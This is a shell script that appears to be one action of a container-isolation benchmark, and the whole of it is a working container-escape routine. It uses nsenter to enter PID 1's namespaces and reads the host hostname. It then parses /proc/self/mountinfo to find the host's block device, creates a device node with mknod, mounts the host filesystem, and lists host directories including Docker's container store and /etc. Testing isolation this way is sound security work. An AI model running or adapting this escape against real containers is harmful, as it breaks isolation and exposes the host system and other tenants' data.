#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
work="/tmp/bench-$marker"

mount_point="/tmp/bench-hostfs-$marker"
device_node="/tmp/bench-hostdev-$marker"

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$work" || exit 1

echo "BENCH_ACTION $(date +%s.%N)"
nsenter --target 1 --mount --uts --ipc --net -- cat /etc/hostname || true

host_mount=$(awk '$5 == "/etc/hostname" || $5 == "/etc/hosts" || $5 == "/etc/resolv.conf" { for (i = 7; i <= NF; i++) if ($i == "-") { print $3, $(i + 1), $(i + 2); exit } }' /proc/self/mountinfo)
if [ -z "$host_mount" ]; then
    echo "no host backed bind mount found in /proc/self/mountinfo"
    exit 1
fi
set -- $host_mount
device_numbers=$1
filesystem=$2
device=$3
echo "host filesystem $filesystem on $device ($device_numbers)"

if [ ! -b "$device" ]; then
    mknod "$device_node" b "${device_numbers%%:*}" "${device_numbers#*:}" || exit 1
    device="$device_node"
fi

mkdir -p "$mount_point" || exit 1
if ! mount -t "$filesystem" -o ro "$device" "$mount_point" 2>/dev/null; then
    mount -t "$filesystem" "$device" "$mount_point" || exit 1
    mount -o remount,bind,ro "$mount_point" || exit 1
fi

ls "$mount_point" > "$work/hostfs.ls" || exit 1
cat "$work/hostfs.ls"
ls "$mount_point/var/lib/docker/containers" 2>/dev/null | head -n 3
ls "$mount_point/etc" 2>/dev/null | head -n 5
exit 0
